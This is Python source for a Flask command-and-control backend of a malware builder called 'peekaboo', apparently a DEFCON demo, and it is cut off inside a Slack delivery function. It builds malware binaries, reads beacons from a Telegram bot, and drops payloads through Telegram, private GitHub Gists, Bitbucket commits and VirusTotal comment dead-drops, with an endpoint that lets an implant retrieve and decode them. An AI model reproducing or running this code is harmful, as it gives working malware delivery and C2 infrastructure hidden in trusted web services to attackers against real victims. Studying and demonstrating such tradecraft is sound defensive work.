"""
peekaboo dashboard - C2 backend + AI chatbot
by @cocomelonc - DEFCON Demo Labs Singapore 2026
"""
from __future__ import annotations
import base64
import hashlib
import json
import os
import re
import shutil
import subprocess
import threading
import time
import uuid
from datetime import datetime
from pathlib import Path

import sys

from flask import Flask, Response, jsonify, render_template, request, send_file, stream_with_context

try:
    import requests as _requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from chatbot import stream_chat, kb_info, has_knowledge_base, providers_status
    HAS_CHATBOT = True
except ImportError:
    HAS_CHATBOT = False
    def providers_status(): return {}

try:
    from mitre import (get_groups, get_group_techniques, get_all_techniques,
                       get_library, build_library_cache, available as mitre_available)
    HAS_MITRE = True
except ImportError:
    HAS_MITRE = False

try:
    import malpedia as _malpedia
    HAS_MALPEDIA = True
except ImportError:
    HAS_MALPEDIA = False

try:
    import discovery as _discovery
    HAS_DISCOVERY = True
except ImportError:
    HAS_DISCOVERY = False

try:
    import compiler as _compiler
    HAS_COMPILER = True
except ImportError:
    HAS_COMPILER = False

app = Flask(__name__)

BASE_DIR     = Path(__file__).parent.parent
CONFIG_DIR   = BASE_DIR / "config"
MALWARE_DIR  = BASE_DIR / "malware"
PAYLOADS_DIR = BASE_DIR / "payloads"
SAMPLES_DIR  = BASE_DIR / "samples"
PIPELINE_DIR = BASE_DIR / "pipeline" / "sessions"
_LEGACY_JSON = Path(__file__).parent / "builds.json"

import db as _db
_db.init()
_migrated = _db.migrate_json(_LEGACY_JSON)
if _migrated:
    print(f"[db] migrated {_migrated} builds from builds.json -> peekaboo.db")
_migrated_s = _db.migrate_samples(SAMPLES_DIR, PIPELINE_DIR)
if _migrated_s:
    print(f"[db] migrated {_migrated_s} samples from filesystem -> peekaboo.db")

# migrate MITRE library JSON cache -> SQLite (runs once, idempotent)
if HAS_MITRE and _db.count_mitre_entries() == 0:
    try:
        from mitre import _LIBRARY_CACHE
        if _LIBRARY_CACHE.exists():
            _cached = json.loads(_LIBRARY_CACHE.read_text())
            if _cached:
                _db.save_mitre_entries(_cached)
                print(f"[db] migrated {len(_cached)} MITRE library entries -> peekaboo.db")
    except Exception as _e:
        print(f"[db] MITRE library migration skipped: {_e}")

# -- in-memory job store --------------------------------------------------------
# BuildManager owns the live-build state + DB persistence + SSE fan-out.
# The legacy `_builds` / `_lock` symbols below are intentionally removed; see
# build_manager.py.
from build_manager import BuildManager, EV_STATE, EV_LINE, EV_END
_build_mgr = BuildManager(
    base_dir    = BASE_DIR,
    malware_dir = MALWARE_DIR,
    peekaboo_py = BASE_DIR / "peekaboo.py",
)


# -- helpers --------------------------------------------------------------------

def get_modules() -> dict:
    def _dirs(p: Path) -> list[str]:
        return sorted(d.name for d in p.iterdir() if d.is_dir()) if p.exists() else []
    def _stems(p: Path, ext: str = "*.c") -> list[str]:
        return sorted(f.stem for f in p.glob(ext)) if p.exists() else []
    return {
        "crypto":      _dirs(MALWARE_DIR / "crypto"),
        "injection":   _dirs(MALWARE_DIR / "injection"),
        "persistence": ["none"] + _stems(MALWARE_DIR / "persistence"),
        "stealer":     _stems(MALWARE_DIR / "stealer"),
        "payloads":    _stems(PAYLOADS_DIR),
    }


def _load_config(name: str) -> dict | None:
    path = CONFIG_DIR / f"{name}.json"
    if not path.exists():
        return None
    try:
        return json.loads(path.read_text())
    except Exception:
        return None


def _find_latest_binary() -> Path | None:
    """Find the most recently built peekaboo.exe anywhere under malware/."""
    candidates = list(MALWARE_DIR.rglob("peekaboo.exe"))
    if not candidates:
        return None
    return max(candidates, key=lambda p: p.stat().st_mtime)


# ---------------------------------------------------------------------------
# C2 source-binary resolution
# ---------------------------------------------------------------------------

_C2_STAGED:     dict[str, dict] = {}   # staged_id -> {path, name, size}
_C2_STAGED_DIR: Path            = BASE_DIR / "data" / "c2_staged"


def _c2_resolve_binary(data: dict) -> Path | None:
    """
    Return the binary Path to deliver based on the 'source' key in the
    request body.  source values:
      'staged'  - manually uploaded via /api/c2/stage
      'build'   - compiled build (build_id + optional fname)
      'session' - captured sample (session_id + filename)
      ''        - fallback: most recently built peekaboo.exe
    """
    source = data.get("source", "")

    if source == "staged":
        entry = _C2_STAGED.get(data.get("staged_id", "").strip())
        if entry:
            p = entry["path"]
            return p if p.exists() else None
        return None

    if source == "build":
        build_id = data.get("build_id", "").strip()
        if not build_id:
            return None
        job = _build_mgr.get(build_id) or {}
        if not job:
            return None
        p = _resolve_build_binary(job)
        if not p:
            return None
        fname = data.get("fname", "").strip()
        if fname and fname != p.name:
            if "/" not in fname and "\\" not in fname and fname.lower().endswith(".exe"):
                alt = p.parent / fname
                if alt.exists():
                    return alt
        return p

    if source == "session":
        session_id = data.get("session_id", "").strip()
        filename   = data.get("filename",   "").strip()
        if not session_id or not filename or "/" in filename or "\\" in filename:
            return None
        filepath = (SAMPLES_DIR / session_id / filename).resolve()
        if not str(filepath).startswith(str(SAMPLES_DIR.resolve())):
            return None
        return filepath if filepath.exists() else None

    return _find_latest_binary()


# _run_build / _save_build moved into BuildManager (build_manager.py).


# -- standard routes ------------------------------------------------------------

@app.route("/")
def index():
    return render_template("index.html",
                           modules=get_modules(),
                           has_chatbot=HAS_CHATBOT,
                           kb=kb_info() if HAS_CHATBOT else {})


@app.route("/api/modules")
def api_modules():
    return jsonify(get_modules())


_ALLOWED_BUILD_FILES = {"peekaboo.exe", "persistence.exe"}


@app.route("/api/build", methods=["POST"])
def api_build():
    params = request.get_json(silent=True) or {}
    build_id = _build_mgr.submit(params)
    return jsonify({"build_id": build_id})


@app.route("/api/build/<build_id>")
def api_build_status(build_id: str):
    job = _build_mgr.get(build_id)
    if not job:
        return jsonify({"error": "not found"}), 404
    return jsonify(job)


@app.route("/api/build/<build_id>/stream")
def api_build_stream(build_id: str):
    """SSE: incremental state + output lines for one running build."""
    def generate():
        try:
            for ev in _build_mgr.tail(build_id):
                yield f"data: {json.dumps(ev)}\n\n"
            yield "data: [DONE]\n\n"
        except GeneratorExit:
            raise
        except Exception as exc:
            try:
                yield f"data: {json.dumps({'type': 'end', 'status': 'error', 'msg': str(exc)})}\n\n"
                yield "data: [DONE]\n\n"
            except GeneratorExit:
                raise

    return Response(
        stream_with_context(generate()),
        content_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


@app.route("/api/build/<build_id>/files")
def api_build_files(build_id: str):
    job = _build_mgr.get(build_id)
    if not job:
        return jsonify({"error": "not found"}), 404
    return jsonify({"files": _build_mgr.list_files(job), "build_id": build_id})


def _resolve_download(build_id: str, filename: str):
    if filename not in _ALLOWED_BUILD_FILES:
        return None, ("not allowed", 400)
    job = _build_mgr.get(build_id)
    if not job:
        return None, ("not found", 404)
    if job.get("status") != "success":
        return None, ("build not successful", 400)
    main = _build_mgr.resolve_binary(job)
    if not main:
        return None, ("binary not found", 404)
    path = main if filename == "peekaboo.exe" else main.parent / filename
    if not path.exists():
        return None, (f"{filename} not found", 404)
    return path, None


@app.route("/api/build/<build_id>/download/<filename>")
def api_build_download(build_id: str, filename: str):
    path, err = _resolve_download(build_id, filename)
    if err:
        return jsonify({"error": err[0]}), err[1]
    return send_file(path, as_attachment=True, download_name=filename,
                     mimetype="application/octet-stream")


@app.route("/api/beacons")
def api_beacons():
    if not HAS_REQUESTS:
        return jsonify({"error": "requests not installed", "messages": []})
    cfg = _load_config("telegram_config")
    if not cfg:
        return jsonify({"error": "telegram_config.json not found", "messages": []})
    token = cfg.get("bot_token", "")
    if not token or "xxx" in token:
        return jsonify({"error": "telegram not configured", "messages": []})
    try:
        resp = _requests.get(f"https://api.telegram.org/bot{token}/getUpdates", timeout=6)
        data = resp.json()
        if not data.get("ok"):
            return jsonify({"error": "telegram API error", "messages": []})
        messages = []
        for update in data.get("result", [])[-30:]:
            msg = update.get("message", {})
            if msg:
                messages.append({
                    "update_id": update["update_id"],
                    "text":      msg.get("text", ""),
                    "date":      msg.get("date", 0),
                    "from":      msg.get("from", {}).get("username", "unknown"),
                    "chat_id":   msg.get("chat", {}).get("id", ""),
                })
        return jsonify({"messages": list(reversed(messages))})
    except Exception as exc:
        return jsonify({"error": str(exc), "messages": []})


@app.route("/api/logs")
def api_logs():
    try:
        limit = min(int(request.args.get("limit", 10)), 200)
        builds = _db.get_builds(limit)
        for b in builds:
            b["binary_files"] = _resolve_build_files(b)
        return jsonify(builds)
    except Exception:
        return jsonify([])


@app.route("/api/logs", methods=["DELETE"])
def api_logs_clear():
    try:
        _db.clear_builds()
        return jsonify({"ok": True})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


@app.route("/api/builds/binaries", methods=["DELETE"])
def api_builds_binaries_clear():
    """Delete all compiled binaries (peekaboo.exe / persistence.exe) under malware/."""
    try:
        deleted = []
        for pattern in ("peekaboo.exe", "persistence.exe"):
            for f in MALWARE_DIR.rglob(pattern):
                try:
                    f.unlink()
                    deleted.append(str(f.relative_to(BASE_DIR)))
                except Exception:
                    pass
        return jsonify({"ok": True, "deleted": len(deleted), "files": deleted})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


# Legacy _resolve_build_binary / _resolve_build_files removed - BuildManager
# (resolve_binary / list_files) is now the only place this math lives.

# Thin shims kept so `/api/logs` and any other callers below still compile.
def _resolve_build_binary(build: dict) -> Path | None:
    return _build_mgr.resolve_binary(build)


def _resolve_build_files(build: dict) -> list[dict]:
    return _build_mgr.list_files(build)


@app.route("/api/build/<build_id>/binary-info")
def api_build_binary_info(build_id: str):
    """Compiled binary info for live or historical builds."""
    job = _build_mgr.get(build_id)
    if not job:
        return jsonify({"error": "not found"}), 404
    return jsonify({"files": _build_mgr.list_files(job)})


@app.route("/api/build/<build_id>/binary/<filename>")
def api_build_binary_download(build_id: str, filename: str):
    """Download a compiled binary from a live or historical build."""
    if filename not in {"peekaboo.exe", "persistence.exe"}:
        return jsonify({"error": "not allowed"}), 400
    job = _build_mgr.get(build_id) or {}
    if not job:
        return jsonify({"error": "not found"}), 404
    if job.get("status") != "success":
        return jsonify({"error": "build not successful"}), 400
    p = _resolve_build_binary(job)
    if not p:
        return jsonify({"error": "binary not found on disk"}), 404
    # if they asked for a different name, look in same directory
    target = p.parent / filename if filename != p.name else p
    if not target.exists():
        return jsonify({"error": f"{filename} not found"}), 404
    # safety: must stay within BASE_DIR
    if not str(target.resolve()).startswith(str(BASE_DIR.resolve())):
        return jsonify({"error": "invalid path"}), 400
    return send_file(target, as_attachment=True, download_name=filename,
                     mimetype="application/octet-stream")


_SAFE_CONFIGS = {
    "telegram_config", "github_config", "bitbucket_config", "virustotal_config",
    "anthropic_config", "gemini_config", "malpedia_config",
    "azure_config", "angelcam_config", "ollama_config", "slack_config",
}
_SECRET_KEYS = {
    "bot_token", "github_token", "api_key", "api_token",
    "bitbucket_token_base64", "vt_api_key", "azure_pat",
}


@app.route("/api/config/<name>")
def api_config(name: str):
    if name not in _SAFE_CONFIGS:
        return jsonify({"error": "unknown config"}), 400
    cfg = _load_config(name)
    if cfg is None:
        return jsonify({"error": "not found"}), 404
    masked = dict(cfg)
    for key in _SECRET_KEYS:
        if key in masked and masked[key]:
            v = str(masked[key])
            masked[key] = v[:4] + "***" if len(v) > 4 else "***"
    return jsonify(masked)


@app.route("/api/config/<name>", methods=["POST"])
def api_config_save(name: str):
    if name not in _SAFE_CONFIGS:
        return jsonify({"error": "unknown config"}), 400
    data = request.get_json(silent=True) or {}
    cfg_path = CONFIG_DIR / f"{name}.json"
    existing = {}
    if cfg_path.exists():
        try:
            existing = json.loads(cfg_path.read_text())
        except Exception:
            pass
    # merge: keep existing secret values when the new value is masked (ends with ***)
    for k, v in data.items():
        if isinstance(v, str) and v.endswith("***"):
            data[k] = existing.get(k, "")
    existing.update(data)
    cfg_path.write_text(json.dumps(existing, indent=2))
    return jsonify({"ok": True})


# -- C2 binary delivery routes --------------------------------------------------

@app.route("/api/c2/stage", methods=["POST"])
def api_c2_stage():
    """Stage an uploaded binary for C2 delivery."""
    f = request.files.get("file")
    if not f:
        return jsonify({"ok": False, "error": "no file provided"}), 400
    name      = Path(f.filename or "payload.bin").name
    staged_id = uuid.uuid4().hex[:8]
    _C2_STAGED_DIR.mkdir(parents=True, exist_ok=True)
    dest = _C2_STAGED_DIR / f"{staged_id}_{name}"
    f.save(str(dest))
    _C2_STAGED[staged_id] = {"path": dest, "name": name, "size": dest.stat().st_size}
    return jsonify({"ok": True, "staged_id": staged_id, "name": name,
                    "size": dest.stat().st_size})


@app.route("/api/c2/status")
def api_c2_status():
    """Check connectivity for each configured C2 channel."""
    if not HAS_REQUESTS:
        return jsonify({"error": "requests not installed"})

    results = {}

    # Telegram
    cfg = _load_config("telegram_config")
    if cfg and cfg.get("bot_token") and "xxx" not in cfg.get("bot_token", ""):
        try:
            r = _requests.get(
                f"https://api.telegram.org/bot{cfg['bot_token']}/getMe",
                timeout=5)
            d = r.json()
            results["telegram"] = {
                "ok": d.get("ok", False),
                "name": d.get("result", {}).get("username", ""),
            }
        except Exception as e:
            results["telegram"] = {"ok": False, "error": str(e)}
    else:
        results["telegram"] = {"ok": False, "error": "not configured"}

    # GitHub
    cfg = _load_config("github_config")
    if cfg and cfg.get("github_token") and "xxx" not in cfg.get("github_token", ""):
        try:
            r = _requests.get(
                "https://api.github.com/user",
                headers={"Authorization": f"Bearer {cfg['github_token']}"},
                timeout=5)
            results["github"] = {
                "ok": r.status_code == 200,
                "name": r.json().get("login", ""),
            }
        except Exception as e:
            results["github"] = {"ok": False, "error": str(e)}
    else:
        results["github"] = {"ok": False, "error": "not configured"}

    # Bitbucket
    cfg = _load_config("bitbucket_config")
    if cfg and cfg.get("bitbucket_token_base64"):
        try:
            token = base64.b64decode(cfg["bitbucket_token_base64"]).decode()
            r = _requests.get(
                "https://api.bitbucket.org/2.0/user",
                headers={"Authorization": f"Basic {cfg['bitbucket_token_base64']}"},
                timeout=5)
            results["bitbucket"] = {
                "ok": r.status_code == 200,
                "name": r.json().get("display_name", ""),
            }
        except Exception as e:
            results["bitbucket"] = {"ok": False, "error": str(e)}
    else:
        results["bitbucket"] = {"ok": False, "error": "not configured"}

    # VirusTotal
    cfg = _load_config("virustotal_config")
    if cfg and cfg.get("vt_api_key"):
        try:
            r = _requests.get(
                "https://www.virustotal.com/api/v3/users/current_user",
                headers={"x-apikey": cfg["vt_api_key"]},
                timeout=5)
            results["virustotal"] = {
                "ok": r.status_code == 200,
                "name": r.json().get("data", {}).get("id", ""),
            }
        except Exception as e:
            results["virustotal"] = {"ok": False, "error": str(e)}
    else:
        results["virustotal"] = {"ok": False, "error": "not configured"}

    # Slack
    cfg = _load_config("slack_config")
    webhook = cfg.get("webhook_url", "") if cfg else ""
    if webhook and "YOUR/WEBHOOK" not in webhook:
        try:
            r = _requests.post(
                webhook,
                json={"text": "[peekaboo] status check - [=^..^=]"},
                timeout=5,
            )
            results["slack"] = {
                "ok":   r.status_code == 200,
                "name": "webhook ok" if r.status_code == 200 else r.text[:60],
            }
        except Exception as e:
            results["slack"] = {"ok": False, "error": str(e)}
    else:
        results["slack"] = {"ok": False, "error": "not configured"}

    return jsonify(results)


@app.route("/api/c2/deliver/telegram", methods=["POST"])
def c2_deliver_telegram():
    """
    Drop the latest built binary via Telegram sendDocument.
    Demonstrates: C2 binary delivery over Telegram bot API.
    MITRE ATT&CK: T1102 (Web Service), T1105 (Ingress Tool Transfer)
    """
    if not HAS_REQUESTS:
        return jsonify({"ok": False, "error": "requests not installed"}), 500

    cfg = _load_config("telegram_config")
    if not cfg:
        return jsonify({"ok": False, "error": "telegram_config.json not found"}), 400

    token   = cfg.get("bot_token", "")
    chat_id = cfg.get("chat_id", "")

    if not token or "xxx" in token:
        return jsonify({"ok": False, "error": "telegram not configured"}), 400

    body   = request.get_json(silent=True) or {}
    binary = _c2_resolve_binary(body)
    if not binary:
        return jsonify({"ok": False, "error": "no binary selected or found"}), 400

    caption = body.get("caption",
        f"[peekaboo] payload drop\n"
        f"file: {binary.name}\n"
        f"size: {binary.stat().st_size} bytes\n"
        f"time: {datetime.utcnow().isoformat()}Z\n"
        f"[=^..^=] DEFCON Demo Labs 2026")

    try:
        with open(binary, "rb") as f:
            resp = _requests.post(
                f"https://api.telegram.org/bot{token}/sendDocument",
                data={"chat_id": chat_id, "caption": caption},
                files={"document": (binary.name, f, "application/octet-stream")},
                timeout=30,
            )
        data = resp.json()
        if data.get("ok"):
            msg = data["result"]
            return jsonify({
                "ok":        True,
                "channel":   "telegram",
                "file":      binary.name,
                "size":      binary.stat().st_size,
                "message_id": msg.get("message_id"),
                "chat_id":   chat_id,
                "url":       f"https://t.me/c/{str(chat_id).lstrip('-100')}/{msg.get('message_id')}",
                "technique": "T1102 + T1105",
            })
        else:
            return jsonify({"ok": False, "error": data.get("description", "unknown")}), 400
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


@app.route("/api/c2/deliver/github", methods=["POST"])
def c2_deliver_github():
    """
    Drop the latest built binary as a GitHub Gist (base64-encoded).
    Simulates: C2 staging via GitHub Gists - implant polls for new gists.
    MITRE ATT&CK: T1102.001 (Dead Drop Resolver), T1105
    """
    if not HAS_REQUESTS:
        return jsonify({"ok": False, "error": "requests not installed"}), 500

    cfg = _load_config("github_config")
    if not cfg:
        return jsonify({"ok": False, "error": "github_config.json not found"}), 400

    token = cfg.get("github_token", "")
    if not token or "xxx" in token:
        return jsonify({"ok": False, "error": "github not configured"}), 400

    body        = request.get_json(silent=True) or {}
    binary      = _c2_resolve_binary(body)
    if not binary:
        return jsonify({"ok": False, "error": "no binary selected or found"}), 400

    description = body.get("description",
        f"peekaboo payload drop - DEFCON Demo Labs 2026 - {datetime.utcnow().isoformat()}Z")

    try:
        encoded = base64.b64encode(binary.read_bytes()).decode()
        # chunk into 60-char lines for readability
        encoded_chunked = "\n".join(encoded[i:i+60] for i in range(0, len(encoded), 60))

        payload = {
            "description": description,
            "public": False,
            "files": {
                f"{binary.stem}_b64.txt": {
                    "content": f"# peekaboo payload - base64 encoded\n# decode: base64 -d <file> > payload.exe\n\n{encoded_chunked}\n"
                },
                "README.md": {
                    "content": (
                        f"# peekaboo drop\n\n"
                        f"**file:** `{binary.name}`  \n"
                        f"**size:** `{binary.stat().st_size}` bytes  \n"
                        f"**time:** `{datetime.utcnow().isoformat()}Z`  \n\n"
                        f"## decode\n```bash\nbase64 -d {binary.stem}_b64.txt > {binary.name}\n```\n\n"
                        f"*DEFCON Demo Labs Singapore 2026 - by @cocomelonc*\n"
                    )
                }
            }
        }

        resp = _requests.post(
            "https://api.github.com/gists",
            headers={"Authorization": f"Bearer {token}",
                     "Accept": "application/vnd.github+json"},
            json=payload,
            timeout=15,
        )

        if resp.status_code == 201:
            data = resp.json()
            return jsonify({
                "ok":       True,
                "channel":  "github",
                "file":     binary.name,
                "size":     binary.stat().st_size,
                "gist_id":  data["id"],
                "url":      data["html_url"],
                "raw_url":  data["files"][f"{binary.stem}_b64.txt"]["raw_url"],
                "technique": "T1102.001 + T1105",
            })
        else:
            return jsonify({"ok": False, "error": resp.json().get("message", resp.text)}), 400

    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


@app.route("/api/c2/deliver/virustotal", methods=["POST"])
def c2_deliver_virustotal():
    """
    VT Comments dead-drop: upload binary for analysis, then stage it as
    base64 chunks in VT file comments. Agent retrieves by SHA256, reads
    comments, and reassembles the binary locally.
    MITRE ATT&CK: T1102 (Web Service), T1102.001 (Dead Drop Resolver), T1105
    Technique used in the wild by: Turla, APT28 (Fancy Bear)
    """
    if not HAS_REQUESTS:
        return jsonify({"ok": False, "error": "requests not installed"}), 500

    cfg = _load_config("virustotal_config")
    if not cfg:
        return jsonify({"ok": False, "error": "virustotal_config.json not found"}), 400

    api_key = cfg.get("vt_api_key", "")
    if not api_key:
        return jsonify({"ok": False, "error": "virustotal not configured"}), 400

    body   = request.get_json(silent=True) or {}
    binary = _c2_resolve_binary(body)
    if not binary:
        return jsonify({"ok": False, "error": "no binary selected or found"}), 400

    try:
        raw    = binary.read_bytes()
        sha256 = hashlib.sha256(raw).hexdigest()

        # 1. Upload to VT (detection scoring demo, registers the SHA256)
        with open(binary, "rb") as f:
            resp = _requests.post(
                "https://www.virustotal.com/api/v3/files",
                headers={"x-apikey": api_key},
                files={"file": (binary.name, f, "application/octet-stream")},
                timeout=60,
            )
        if resp.status_code not in (200, 201):
            try:
                err = resp.json().get("error", {}).get("message", "")
            except Exception:
                err = resp.text[:200]
            return jsonify({"ok": False,
                            "error": f"VT upload failed (HTTP {resp.status_code}): {err}"}), 400

        analysis_id = resp.json().get("data", {}).get("id", "")

        # 2. Build a resolver descriptor so the single comment stays small.
        #    The comment encodes HOW to re-obtain the binary; the binary never
        #    travels through VT.  This is the real T1102.001 pattern:
        #    operator posts a pointer on a trusted service; agent resolves it.
        source = body.get("source", "")
        if source == "staged" and body.get("staged_id"):
            descriptor = f"staged:{body['staged_id']}"
        elif source == "build" and body.get("build_id"):
            fname_part = body.get("fname") or "peekaboo.exe"
            descriptor = f"build:{body['build_id']}:{fname_part}"
        elif source == "session" and body.get("session_id"):
            descriptor = f"session:{body['session_id']}:{body.get('filename', '')}"
        else:
            # Fallback: auto-stage the binary so the retrieve endpoint can find it
            _C2_STAGED_DIR.mkdir(parents=True, exist_ok=True)
            s_id = uuid.uuid4().hex[:8]
            dest = _C2_STAGED_DIR / f"{s_id}_{binary.name}"
            dest.write_bytes(raw)
            _C2_STAGED[s_id] = {"path": dest, "name": binary.name, "size": len(raw)}
            descriptor = f"staged:{s_id}"

        comment_text = f"PEEKABOO|RESOLVER|{descriptor}"

        # 3. Post ONE resolver comment.
        #    VT needs time to index the SHA256 after upload before the
        #    file/{sha256}/comments endpoint accepts writes.
        #    Retry with back-off: 5 s -> 10 s -> 15 s -> 20 s (50 s total max).
        comment_posted = False
        comment_error  = ""
        waited_secs    = 0
        for delay in (5, 10, 15, 20):
            time.sleep(delay)
            waited_secs += delay
            cr = _requests.post(
                f"https://www.virustotal.com/api/v3/files/{sha256}/comments",
                headers={"x-apikey": api_key, "Content-Type": "application/json"},
                json={"data": {"type": "comment", "attributes": {"text": comment_text}}},
                timeout=15,
            )
            if cr.status_code in (200, 201):
                comment_posted = True
                break
            try:
                comment_error = cr.json().get("error", {}).get("message",
                                                               f"HTTP {cr.status_code}")
            except Exception:
                comment_error = f"HTTP {cr.status_code}"
            # 404 = not indexed yet, 429 = rate limit -> keep retrying
            if cr.status_code not in (404, 429):
                break

        return jsonify({
            "ok":             True,
            "channel":        "virustotal",
            "technique":      "T1102 + T1102.001",
            "file":           binary.name,
            "size":           len(raw),
            "sha256":         sha256,
            "analysis_id":    analysis_id,
            "analysis_url":   f"https://www.virustotal.com/gui/file-analysis/{analysis_id}",
            "comment_posted": comment_posted,
            "comment_error":  comment_error,
            "descriptor":     descriptor,
            "waited_secs":    waited_secs,
            "note":           (
                "Resolver comment posted - agent reads VT comment, resolves descriptor, fetches binary."
                if comment_posted else
                f"Upload OK but resolver comment failed: {comment_error}. "
                "Try Retrieve anyway - comment may appear after analysis completes."
            ),
        })
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


@app.route("/api/c2/retrieve/virustotal", methods=["POST"])
def c2_retrieve_virustotal():
    """
    Agent-side retrieval: read PEEKABOO comment from VT by SHA256,
    resolve the descriptor, and return the binary as base64.
    Supports PEEKABOO|RESOLVER|{descriptor} (new) and
    legacy PEEKABOO|CHUNK| (chunked base64) comments.
    MITRE ATT&CK: T1102.001 (Dead Drop Resolver)
    """
    if not HAS_REQUESTS:
        return jsonify({"ok": False, "error": "requests not installed"}), 500

    cfg = _load_config("virustotal_config")
    if not cfg:
        return jsonify({"ok": False, "error": "virustotal_config.json not found"}), 400

    api_key = cfg.get("vt_api_key", "")
    if not api_key:
        return jsonify({"ok": False, "error": "virustotal not configured"}), 400

    req    = request.get_json(force=True) or {}
    sha256 = req.get("sha256", "").strip().lower()
    if not sha256 or len(sha256) != 64 or not all(c in "0123456789abcdef" for c in sha256):
        return jsonify({"ok": False, "error": "valid sha256 required"}), 400

    try:
        # Fetch all comments for this file (paginated)
        all_comments: list[dict] = []
        next_url: str | None = (
            f"https://www.virustotal.com/api/v3/files/{sha256}/comments?limit=40"
        )
        while next_url:
            r = _requests.get(next_url, headers={"x-apikey": api_key}, timeout=15)
            if r.status_code != 200:
                break
            page     = r.json()
            all_comments.extend(page.get("data", []))
            cursor   = page.get("meta", {}).get("cursor")
            next_url = (
                f"https://www.virustotal.com/api/v3/files/{sha256}"
                f"/comments?limit=40&cursor={cursor}"
            ) if cursor else None

        # --- New format: PEEKABOO|RESOLVER|{descriptor} ---
        descriptor: str | None = None
        for c in all_comments:
            text = c.get("attributes", {}).get("text", "")
            if text.startswith("PEEKABOO|RESOLVER|"):
                descriptor = text[len("PEEKABOO|RESOLVER|"):]
                break

        if descriptor is not None:
            if descriptor.startswith("staged:"):
                s_id  = descriptor[7:]
                entry = _C2_STAGED.get(s_id)
                if not entry or not entry["path"].exists():
                    return jsonify({"ok": False,
                                    "error": f"staged binary not found: {s_id}"})
                payload = entry["path"].read_bytes()

            elif descriptor.startswith("build:"):
                parts    = descriptor[6:].split(":", 1)
                build_id = parts[0]
                fname    = parts[1] if len(parts) > 1 else "peekaboo.exe"
                p = _c2_resolve_binary({"source": "build",
                                        "build_id": build_id, "fname": fname})
                if not p:
                    return jsonify({"ok": False,
                                    "error": f"build binary not found: {descriptor}"})
                payload = p.read_bytes()

            elif descriptor.startswith("session:"):
                parts = descriptor[8:].split(":", 1)
                sid   = parts[0]
                fn    = parts[1] if len(parts) > 1 else ""
                p = _c2_resolve_binary({"source": "session",
                                        "session_id": sid, "filename": fn})
                if not p:
                    return jsonify({"ok": False,
                                    "error": f"session file not found: {descriptor}"})
                payload = p.read_bytes()

            else:
                return jsonify({"ok": False,
                                "error": f"unknown descriptor format: {descriptor[:60]}"})

            return jsonify({
                "ok":          True,
                "sha256":      sha256,
                "descriptor":  descriptor,
                "size":        len(payload),
                "payload_b64": base64.b64encode(payload).decode(),
                "technique":   "T1102.001",
                "mode":        "resolver",
            })

        # --- Legacy format: PEEKABOO|CHUNK|{total}|{idx}|{data} ---
        chunk_map:      dict[int, str] = {}
        total_expected: int | None     = None
        for c in all_comments:
            text = c.get("attributes", {}).get("text", "")
            if not text.startswith("PEEKABOO|CHUNK|"):
                continue
            parts = text.split("|", 5)
            if len(parts) < 5:
                continue
            try:
                tot  = int(parts[2])
                idx  = int(parts[3])
                chunk_map[idx] = parts[4]
                total_expected = tot
            except ValueError:
                continue

        if total_expected is None:
            return jsonify({"ok": False,
                            "error": "no PEEKABOO resolver or chunk comments found"})
        if len(chunk_map) != total_expected:
            return jsonify({
                "ok":              False,
                "error":           f"incomplete chunks: got {len(chunk_map)}/{total_expected}",
                "chunks_found":    len(chunk_map),
                "chunks_expected": total_expected,
            })

        encoded = "".join(chunk_map[i] for i in range(total_expected))
        payload  = base64.b64decode(encoded)

        return jsonify({
            "ok":          True,
            "sha256":      sha256,
            "size":        len(payload),
            "chunks":      total_expected,
            "payload_b64": base64.b64encode(payload).decode(),
            "technique":   "T1102.001",
            "mode":        "chunks",
        })
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


@app.route("/api/c2/deliver/bitbucket", methods=["POST"])
def c2_deliver_bitbucket():
    """
    Push the latest built binary to Bitbucket repo as base64-encoded file.
    Demonstrates: Bitbucket as C2 staging channel.
    MITRE ATT&CK: T1102 (Web Service), T1105
    """
    if not HAS_REQUESTS:
        return jsonify({"ok": False, "error": "requests not installed"}), 500

    cfg = _load_config("bitbucket_config")
    if not cfg:
        return jsonify({"ok": False, "error": "bitbucket_config.json not found"}), 400

    token_b64 = cfg.get("bitbucket_token_base64", "")
    workspace = cfg.get("bitbucket_workspace", "")
    repo      = cfg.get("bitbucket_repo", "")

    if not all([token_b64, workspace, repo]):
        return jsonify({"ok": False, "error": "bitbucket not fully configured"}), 400

    body   = request.get_json(silent=True) or {}
    binary = _c2_resolve_binary(body)
    if not binary:
        return jsonify({"ok": False, "error": "no binary selected or found"}), 400

    try:
        encoded = base64.b64encode(binary.read_bytes()).decode()
        ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        filename = f"drops/{ts}_{binary.stem}_b64.txt"

        content = (
            f"# peekaboo payload drop\n"
            f"# time: {datetime.utcnow().isoformat()}Z\n"
            f"# file: {binary.name} ({binary.stat().st_size} bytes)\n"
            f"# decode: base64 -d <this_file> > {binary.name}\n\n"
            f"{encoded}\n"
        )

        resp = _requests.post(
            f"https://api.bitbucket.org/2.0/repositories/{workspace}/{repo}/src",
            headers={"Authorization": f"Basic {token_b64}"},
            data={
                filename: content,
                "message": f"[peekaboo] payload drop {ts} - DEFCON Demo 2026",
                "branch": "main",
            },
            timeout=20,
        )

        if resp.status_code in (200, 201):
            file_url = f"https://bitbucket.org/{workspace}/{repo}/src/main/{filename}"
            return jsonify({
                "ok":       True,
                "channel":  "bitbucket",
                "file":     binary.name,
                "size":     binary.stat().st_size,
                "path":     filename,
                "url":      file_url,
                "technique": "T1102 + T1105",
            })
        else:
            return jsonify({"ok": False, "error": resp.text[:300]}), 400
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


@app.route("/api/c2/deliver/slack", methods=["POST"])
def c2_deliver_slack():
    """
    Send a notification + binary info to a Slack channel via incoming webhook.
    Demonstrates: covert exfiltration / C2 beacon over Slack API.
    MITRE ATT&CK: T1102 (Web Service), T1071.001 (Application Layer Protocol)
    """
    if not HAS_REQUESTS:
        return jsonify({"ok": False, "error": "requests not installed"}), 500

    cfg = _load_config("slack_config")
    if not cfg:
        return jsonify({"ok": False, "error": "slack_config.json not found"}), 400

